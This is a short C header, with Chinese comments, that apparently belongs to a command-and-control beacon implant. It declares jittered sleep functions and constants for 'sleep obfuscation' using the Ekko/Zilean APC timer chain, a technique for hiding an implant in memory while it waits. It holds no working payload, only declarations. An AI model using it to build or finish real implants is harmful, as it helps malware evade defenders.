#pragma once

#include "beacon_context.h"

/* 睡眠混淆最小延迟（ms），低于此值跳过混淆 */
#define SLEEP_OBF_MIN_MS 1000u

/* 带掩码的最小睡眠时间（ms） */
#define SLEEP_OBF_MIN_MASK_MS 500u

/* 混淆设置阶段预算（ms） */
#define SLEEP_OBF_SETUP_BUDGET 1000u

/* 定时器步进间隔（ms） */
#define SLEEP_OBF_TIMER_STEP_MS 100u

/* 定时器阶段数量（Ekko/Zilean APC 链长度） */
#define SLEEP_OBF_TIMER_STAGE_COUNT 7u

/* 根据 sleep_ms 和 jitter 计算带随机抖动的睡眠时长（ms） */
DWORD SleepCalculateWithJitter(const Profile* profile);

/*
 * 统一等待入口：根据配置选择 plain sleep 或 sleep obfuscation。
 * 支持多句柄等待（用于级联 event + wake_event）。
 */
DWORD BeaconWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD timeout_ms);

/* 信标睡眠：计算抖动时长并通过 BeaconWait 执行 */
VOID BeaconSleep(BeaconContext* ctx);
